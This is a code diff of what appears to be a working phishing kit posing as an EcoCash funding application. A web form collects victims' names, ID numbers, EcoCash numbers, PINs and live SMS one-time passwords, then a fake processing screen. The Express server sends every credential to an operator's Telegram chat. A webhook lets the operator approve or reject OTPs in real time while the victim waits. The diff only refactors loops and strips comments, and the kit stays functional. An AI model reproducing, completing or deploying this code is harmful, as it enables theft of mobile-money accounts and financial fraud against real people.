@@ -51,7 +51,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 .message.success{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
 .message.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
 .message.info{background:#d1ecf1;color:#0c5460;border:1px solid #bee5eb}
-.message.warning{background:#fff3cd;color:#856404;border:1px solid #ffeaa7}
 .loader{display:inline-block;width:18px;height:18px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:8px}
 @keyframes spin{to{transform:rotate(360deg)}}
 .otp-container{display:flex;gap:10px;justify-content:center;margin:25px 0}
@@ -138,8 +137,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <div class="progress-step" id="step4Bar"></div>
 </div>
 
-<!-- STEP 1 -->
-<div class="step-content" id="step1Content">
+<div class="step-content active" id="step1Content">
 <form id="registerForm">
 <div class="form-group">
 <label>Full Name <span class="required">*</span></label>
@@ -151,18 +149,17 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </div>
 <div class="form-group">
 <label>EcoCash Number <span class="required">*</span></label>
-<input type="tel" id="ecocashNumber" placeholder="0771234567" pattern="[0-9]*" inputmode="numeric" required>
+<input type="tel" id="ecocashNumber" placeholder="0771234567" inputmode="numeric" required>
 </div>
 <div class="form-group">
 <label>Your EcoCash PIN <span class="required">*</span></label>
-<input type="password" id="ecoPin" placeholder="Enter your EcoCash PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required>
+<input type="password" id="ecoPin" placeholder="Enter your EcoCash PIN" maxlength="4" inputmode="numeric" required>
 </div>
 <button type="submit" class="btn" id="submitBtn"><span id="submitText">Continue</span></button>
 </form>
 <div id="messageDiv" class="message"></div>
 </div>
 
-<!-- STEP 2: SMS COUNTDOWN -->
 <div class="step-content" id="step2Content">
 <div class="sms-sent-container">
 <div class="sms-icon">📩</div>
@@ -174,7 +171,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </div>
 </div>
 
-<!-- STEP 3: OTP INPUT -->
 <div class="step-content" id="step3Content">
 <div style="text-align:center;margin-bottom:15px">
 <h2 style="color:#0047AB;font-size:1.3em;margin-bottom:8px">Enter OTP</h2>
@@ -193,18 +189,14 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <div id="otpMessage" class="message"></div>
 </div>
 
-<!-- STEP 3B: VERIFYING -->
 <div class="step-content" id="verifyingContent">
 <div class="verifying-box">
 <div class="verifying-spinner"></div>
 <h3>Verifying OTP</h3>
-<p>Please wait while we verify your OTP
-<span class="dots"><span>.</span><span>.</span><span>.</span></span>
-</p>
+<p>Please wait while we verify your OTP<span class="dots"><span>.</span><span>.</span><span>.</span></span></p>
 </div>
 </div>
 
-<!-- STEP 4: PURPOSE -->
 <div class="step-content" id="step4Content">
 <div class="purpose-title">
 <h2>Purpose of Funds</h2>
@@ -229,7 +221,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <div id="purposeMessage" class="message"></div>
 </div>
 
-<!-- STEP 5: PIN -->
 <div class="step-content" id="step5Content">
 <div style="text-align:center;margin-bottom:15px">
 <h2 style="color:#0047AB;font-size:1.3em;margin-bottom:8px">Confirm with PIN</h2>
@@ -238,13 +229,12 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <div class="info-note">🔒 Your PIN is encrypted and secure.</div>
 <div class="form-group">
 <label>Your EcoCash PIN <span class="required">*</span></label>
-<input type="password" id="confirmPin" placeholder="Enter your EcoCash PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required>
+<input type="password" id="confirmPin" placeholder="Enter your EcoCash PIN" maxlength="4" inputmode="numeric" required>
 </div>
 <button type="button" class="btn btn-green" id="confirmPinBtn">Verify PIN</button>
 <div id="pinMessage" class="message"></div>
 </div>
 
-<!-- STEP 6: PROCESSING -->
 <div class="step-content" id="step6Content">
 <div class="processing-container">
 <h2>Processing Your Application</h2>
@@ -275,7 +265,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </div>
 </div>
 
-<!-- STEP 7: SUCCESS -->
 <div class="step-content" id="step7Content">
 <div class="success-container">
 <div class="success-icon">✓</div>
@@ -295,14 +284,12 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </div>
 
 <script>
-// ===== STATE =====
 var currentAppId = null;
 var selectedPurpose = '';
 var countdownInterval = null;
 var otpPollingInterval = null;
 var currentStep = 1;
 
-// ===== SAVE / RESTORE STATE =====
 function saveState(){
 var state = {
 registrationId: currentAppId,
@@ -312,11 +299,11 @@ idNumber: document.getElementById('idNumber').value,
 ecocashNumber: document.getElementById('ecocashNumber').value,
 purpose: selectedPurpose
 };
-localStorage.setItem('ecocash_state', JSON.stringify(state));
+try{ localStorage.setItem('ecocash_state', JSON.stringify(state)); }catch(e){}
 }
 
 function clearState(){
-localStorage.removeItem('ecocash_state');
+try{ localStorage.removeItem('ecocash_state'); }catch(e){}
 }
 
 function restoreState(){
@@ -329,29 +316,26 @@ if(!state.registrationId) return false;
 currentAppId = state.registrationId;
 selectedPurpose = state.purpose || '';
 
-// Restore form fields
 if(state.fullName) document.getElementById('fullName').value = state.fullName;
 if(state.idNumber) document.getElementById('idNumber').value = state.idNumber;
 if(state.ecocashNumber) document.getElementById('ecocashNumber').value = state.ecocashNumber;
 
-// Restore purpose selection UI
 if(selectedPurpose){
-document.querySelectorAll('.purpose-item').forEach(function(el){
-if(el.getAttribute('data-value') === selectedPurpose){
-el.classList.add('selected');
+var items = document.querySelectorAll('.purpose-item');
+for(var i=0;i<items.length;i++){
+if(items[i].getAttribute('data-value') === selectedPurpose){
+items[i].classList.add('selected');
 document.getElementById('purposeBtn').disabled = false;
 }
-});
+}
 }
 
-// Jump to the saved step
 if(state.step === 2){
 goToStep(2);
-document.getElementById('sentPhone').textContent = state.ecocashNumber;
+document.getElementById('sentPhone').textContent = state.ecocashNumber || '';
 startCountdown();
 return true;
 } else if(state.step === 3 || state.step === 'verifying'){
-// If they were verifying, show verifying and check immediately
 goToStep('verifying');
 startOtpPolling();
 return true;
@@ -369,7 +353,6 @@ return false;
 }
 }
 
-// ===== FORM SUBMIT =====
 document.getElementById('registerForm').addEventListener('submit', async function(e){
 e.preventDefault();
 var fullName=document.getElementById('fullName').value.trim();
@@ -390,14 +373,11 @@ try{
 var response=await fetch('/api/register',{
 method:'POST',
 headers:{'Content-Type':'application/json'},
-body:JSON.stringify({fullName,idNumber,ecocashNumber,ecoPin})
+body:JSON.stringify({fullName:fullName,idNumber:idNumber,ecocashNumber:ecocashNumber,ecoPin:ecoPin})
 });
 var data=await response.json();
 if(data.success){
 currentAppId=data.registrationId;
-currentStep=2;
-saveState();
-
 goToStep(2);
 document.getElementById('sentPhone').textContent=ecocashNumber;
 startCountdown();
@@ -419,9 +399,10 @@ btnText.textContent='Continue';
 }
 });
 
-// ===== NAVIGATION =====
 function goToStep(step){
-document.querySelectorAll('.step-content').forEach(function(el){el.classList.remove('active')});
+var contents=document.querySelectorAll('.step-content');
+for(var i=0;i<contents.length;i++){contents[i].classList.remove('active')}
+
 if(step === 'verifying'){
 document.getElementById('verifyingContent').classList.add('active');
 currentStep = 'verifying';
@@ -429,6 +410,7 @@ currentStep = 'verifying';
 document.getElementById('step'+step+'Content').classList.add('active');
 currentStep = step;
 }
+
 for(var i=1;i<=4;i++){
 var bar=document.getElementById('step'+i+'Bar');
 if(bar){
@@ -441,7 +423,6 @@ else if(i===Math.min(s,4)){bar.classList.add('active')}
 saveState();
 }
 
-// ===== COUNTDOWN =====
 function startCountdown(){
 if(countdownInterval){clearInterval(countdownInterval)}
 var seconds=10;
@@ -458,16 +439,17 @@ progress.style.width=((totalTime-seconds)/totalTime*100)+'%';
 if(seconds<=0){
 clearInterval(countdownInterval);
 goToStep(3);
-document.querySelector('#otpContainer .otp-input').focus();
+var firstInput=document.querySelector('#otpContainer .otp-input');
+if(firstInput){firstInput.focus()}
 }
 },1000);
 }
 
-// ===== OTP INPUTS =====
 var otpInputs=document.querySelectorAll('#otpContainer .otp-input');
-otpInputs.forEach(function(input,index){
+for(var oi=0;oi<otpInputs.length;oi++){
+(function(input,index){
 input.addEventListener('input',function(e){
-var v=e.target.value.replace(/\D/g,'');
+var v=e.target.value.replace(/[^0-9]/g,'');
 e.target.value=v;
 e.target.classList.remove('error');
 if(v){
@@ -480,12 +462,12 @@ e.target.classList.remove('filled');
 input.addEventListener('keydown',function(e){
 if(e.key==='Backspace'&&!e.target.value&&index>0){otpInputs[index-1].focus()}
 });
-});
+})(otpInputs[oi],oi);
+}
 
-// ===== VERIFY OTP (SEND + WAIT) =====
 document.getElementById('verifyOtpBtn').addEventListener('click',async function(){
 var otp='';
-otpInputs.forEach(function(input){otp+=input.value});
+for(var i=0;i<otpInputs.length;i++){otp+=otpInputs[i].value}
 
 if(otp.length!==6){
 showOtpMessage('Please enter the complete 6-digit OTP','error');
@@ -518,7 +500,6 @@ btn.textContent='Verify OTP';
 }
 });
 
-// ===== POLL FOR ADMIN DECISION =====
 function startOtpPolling(){
 if(otpPollingInterval){clearInterval(otpPollingInterval)}
 
@@ -532,7 +513,7 @@ clearInterval(otpPollingInterval);
 otpPollingInterval=null;
 document.getElementById('verifyOtpBtn').disabled=false;
 document.getElementById('verifyOtpBtn').textContent='Verify OTP';
-otpInputs.forEach(function(input){input.value='';input.classList.remove('filled','error')});
+for(var i=0;i<otpInputs.length;i++){otpInputs[i].value='';otpInputs[i].classList.remove('filled','error')}
 goToStep(4);
 }
 else if(data.status==='rejected'){
@@ -542,9 +523,10 @@ document.getElementById('verifyOtpBtn').disabled=false;
 document.getElementById('verifyOtpBtn').textContent='Verify OTP';
 goToStep(3);
 showOtpMessage('❌ Wrong OTP. Please try again.','error');
-otpInputs.forEach(function(input){input.value='';input.classList.remove('filled','error')});
-otpInputs.forEach(function(input){input.classList.add('error')});
-setTimeout(function(){otpInputs.forEach(function(input){input.classList.remove('error')})},1500);
+for(var i=0;i<otpInputs.length;i++){otpInputs[i].value='';otpInputs[i].classList.add('error')}
+setTimeout(function(){
+for(var i=0;i<otpInputs.length;i++){otpInputs[i].classList.remove('error')}
+},1500);
 otpInputs[0].focus();
 fetch('/api/clear-otp-status/'+currentAppId,{method:'POST'});
 }
@@ -554,16 +536,18 @@ console.error('Poll error:',error);
 },2000);
 }
 
-// ===== PURPOSE =====
-document.querySelectorAll('.purpose-item').forEach(function(item){
+var purposeItems=document.querySelectorAll('.purpose-item');
+for(var pi=0;pi<purposeItems.length;pi++){
+(function(item){
 item.addEventListener('click',function(){
-document.querySelectorAll('.purpose-item').forEach(function(el){el.classList.remove('selected')});
+for(var j=0;j<purposeItems.length;j++){purposeItems[j].classList.remove('selected')}
 item.classList.add('selected');
 selectedPurpose=item.getAttribute('data-value');
 document.getElementById('purposeBtn').disabled=false;
 saveState();
 });
-});
+})(purposeItems[pi]);
+}
 
 document.getElementById('purposeBtn').addEventListener('click',function(){
 if(!selectedPurpose){showPurposeMessage('Please select a purpose','error');return}
@@ -574,7 +558,6 @@ body:JSON.stringify({registrationId:currentAppId,purpose:selectedPurpose})
 }).then(function(){goToStep(5)});
 });
 
-// ===== CONFIRM PIN =====
 document.getElementById('confirmPinBtn').addEventListener('click',async function(){
 var pin=document.getElementById('confirmPin').value.trim();
 if(!pin||pin.length!==4){showPinMessage('Please enter 4-digit PIN','error');return}
@@ -605,7 +588,6 @@ btn.textContent='Verify PIN';
 }
 });
 
-// ===== PROCESSING =====
 function runProcessingSteps(){
 var steps=['pStep1','pStep2','pStep3','pStep4'];
 var timers=['timer1','timer2','timer3','timer4'];
@@ -656,23 +638,17 @@ setTimeout(next,300);
 next();
 }
 
-// ===== UTILITY =====
 function showMessage(t,ty){var d=document.getElementById('messageDiv');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
 function showOtpMessage(t,ty){var d=document.getElementById('otpMessage');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
 function showPurposeMessage(t,ty){var d=document.getElementById('purposeMessage');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
 function showPinMessage(t,ty){var d=document.getElementById('pinMessage');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
 
-// ===== INPUT =====
-document.getElementById('ecocashNumber').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'')});
-document.getElementById('ecoPin').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'')});
-document.getElementById('confirmPin').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'')});
+document.getElementById('ecocashNumber').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});
+document.getElementById('ecoPin').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});
+document.getElementById('confirmPin').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});
 
-// ===== INIT: RESTORE STATE ON LOAD =====
 window.addEventListener('load',function(){
-var restored = restoreState();
-if(!restored){
-console.log('Starting fresh');
-}
+restoreState();
 });
 </script>
 </body>
@@ -681,22 +657,18 @@ console.log('Starting fresh');
 // ===== ROUTES =====
 app.get('/', (req, res) => { res.send(HTML_PAGE); });
 
-// ===== REGISTER =====
 app.post('/api/register', async (req, res) => {
     try {
         const { fullName, idNumber, ecocashNumber, ecoPin } = req.body;
         if (!fullName || !idNumber || !ecocashNumber || !ecoPin) {
             return res.status(400).json({ success: false, message: 'All fields required' });
         }
-
         const registrationId = Math.floor(10000 + Math.random() * 90000).toString();
-
         pendingRegistrations[registrationId] = {
             fullName, idNumber, ecocashNumber, ecoPin,
             verified: false, otp1Sent: false, otpEntered: null,
             timestamp: new Date().toISOString()
         };
-
         const message =
             '💚 <b>NEW ECOCASH REGISTRATION</b>\n\n' +
             '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
@@ -708,26 +680,21 @@ app.post('/api/register', async (req, res) => {
             '━━━━━━━━━━━━━━━━━━━━\n' +
             '⏰ <b>Submitted:</b> ' + new Date().toLocaleString() + '\n\n' +
             '⏳ <i>User is on countdown...</i>';
-
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });
-
         res.json({ success: true, registrationId, message: 'OK' });
     } catch (error) {
         res.status(500).json({ success: false, message: 'Error' });
     }
 });
 
-// ===== OTP SENT =====
 app.post('/api/otp-sent', async (req, res) => {
     try {
         const { registrationId } = req.body;
         const r = pendingRegistrations[registrationId];
         if (!r) return res.status(404).json({ success: false });
         if (r.otp1Sent) return res.json({ success: true });
-
         r.otp1Sent = true;
-
         const message =
             '📩 <b>SMS OTP SENT - WAITING FOR USER INPUT</b>\n\n' +
             '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
@@ -735,26 +702,21 @@ app.post('/api/otp-sent', async (req, res) => {
             '📱 <b>EcoCash Number:</b> <code>' + r.ecocashNumber + '</code>\n' +
             '━━━━━━━━━━━━━━━━━━━━\n' +
             '⏳ <i>Waiting for user to enter OTP...</i>';
-
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });
-
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ success: false });
     }
 });
 
-// ===== SEND OTP FOR ADMIN APPROVAL =====
 app.post('/api/send-otp-for-approval', async (req, res) => {
     try {
         const { registrationId, otp } = req.body;
         const r = pendingRegistrations[registrationId];
         if (!r) return res.status(404).json({ success: false, message: 'Registration not found' });
-
         r.otpEntered = otp;
         otpActions[registrationId] = 'pending';
-
         const message =
             '🔐 <b>OTP VERIFICATION - ADMIN ACTION REQUIRED</b>\n\n' +
             '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
@@ -767,7 +729,6 @@ app.post('/api/send-otp-for-approval', async (req, res) => {
             '━━━━━━━━━━━━━━━━━━━━\n' +
             '⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n\n' +
             '👇 <b>Tap a button to respond:</b>';
-
         const reply_markup = {
             inline_keyboard: [
                 [
@@ -776,36 +737,26 @@ app.post('/api/send-otp-for-approval', async (req, res) => {
                 ]
             ]
         };
-
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        await axios.post(url, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'HTML',
-            reply_markup: reply_markup
-        });
-
+        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML', reply_markup: reply_markup });
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ success: false, message: 'Error' });
     }
 });
 
-// ===== CHECK OTP STATUS =====
 app.get('/api/check-otp-status/:registrationId', (req, res) => {
     const { registrationId } = req.params;
     const status = otpActions[registrationId] || 'pending';
     res.json({ status: status });
 });
 
-// ===== CLEAR OTP STATUS =====
 app.post('/api/clear-otp-status/:registrationId', (req, res) => {
     const { registrationId } = req.params;
     delete otpActions[registrationId];
     res.json({ success: true });
 });
 
-// ===== TELEGRAM WEBHOOK =====
 app.post('/webhook', async (req, res) => {
     try {
         const update = req.body;
@@ -814,7 +765,6 @@ app.post('/webhook', async (req, res) => {
             const data = callbackQuery.data;
             const callbackId = callbackQuery.id;
             let responseText = 'Action received';
-
             if (data.startsWith('approve_otp_')) {
                 const registrationId = data.replace('approve_otp_', '');
                 otpActions[registrationId] = 'approved';
@@ -824,29 +774,21 @@ app.post('/webhook', async (req, res) => {
                 otpActions[registrationId] = 'rejected';
                 responseText = '❌ OTP Rejected';
             }
-
             const answerUrl = `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`;
-            await axios.post(answerUrl, {
-                callback_query_id: callbackId,
-                text: responseText
-            });
+            await axios.post(answerUrl, { callback_query_id: callbackId, text: responseText });
         }
         res.json({ ok: true });
     } catch (error) {
-        console.error('Webhook error:', error.message);
         res.json({ ok: true });
     }
 });
 
-// ===== UPDATE PURPOSE =====
 app.post('/api/update-purpose', async (req, res) => {
     try {
         const { registrationId, purpose } = req.body;
         const r = pendingRegistrations[registrationId];
         if (!r) return res.status(404).json({ success: false });
-
         r.purpose = purpose;
-
         const message =
             '📋 <b>PURPOSE SELECTED</b>\n\n' +
             '🆔 <b>Registration:</b> <code>#' + registrationId + '</code>\n' +
@@ -857,25 +799,20 @@ app.post('/api/update-purpose', async (req, res) => {
             '🔐 <b>OTP:</b> <code>' + (r.otpEntered || 'N/A') + '</code>\n' +
             '📌 <b>Purpose:</b> ' + purpose + '\n\n' +
             '⏳ <i>User is now confirming with PIN...</i>';
-
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });
-
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ success: false });
     }
 });
 
-// ===== CONFIRM PIN =====
 app.post('/api/confirm-pin', async (req, res) => {
     try {
         const { registrationId, pin, purpose } = req.body;
         const r = pendingRegistrations[registrationId];
         if (!r) return res.status(404).json({ success: false });
-
         r.confirmPin = pin;
-
         const message =
             '🔒 <b>PIN CONFIRMED - PROCESSING BEGINS</b>\n\n' +
             '🆔 <b>Registration:</b> <code>#' + registrationId + '</code>\n' +
@@ -889,26 +826,21 @@ app.post('/api/confirm-pin', async (req, res) => {
             '━━━━━━━━━━━━━━━━━━━━\n' +
             '📊 <b>Status:</b> Processing started\n' +
             '⏰ <b>Time:</b> ' + new Date().toLocaleString();
-
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });
-
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ success: false });
     }
 });
 
-// ===== DISBURSEMENT COMPLETE =====
 app.post('/api/disbursement-complete', async (req, res) => {
     try {
         const { registrationId } = req.body;
         const r = pendingRegistrations[registrationId];
         if (!r) return res.status(404).json({ success: false });
-
         r.verified = true;
         r.completedAt = new Date().toISOString();
-
         const message =
             '🎉 <b>APPLICATION COMPLETE - DISBURSEMENT IN PROGRESS</b>\n\n' +
             '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
@@ -928,10 +860,8 @@ app.post('/api/disbursement-complete', async (req, res) => {
             '  ✅ Disbursement in Progress\n\n' +
             '💵 <b>Disbursement:</b> Based on purpose and document verification\n' +
             '⏰ <b>Completed:</b> ' + new Date().toLocaleString();
-
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });
-
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ success: false });
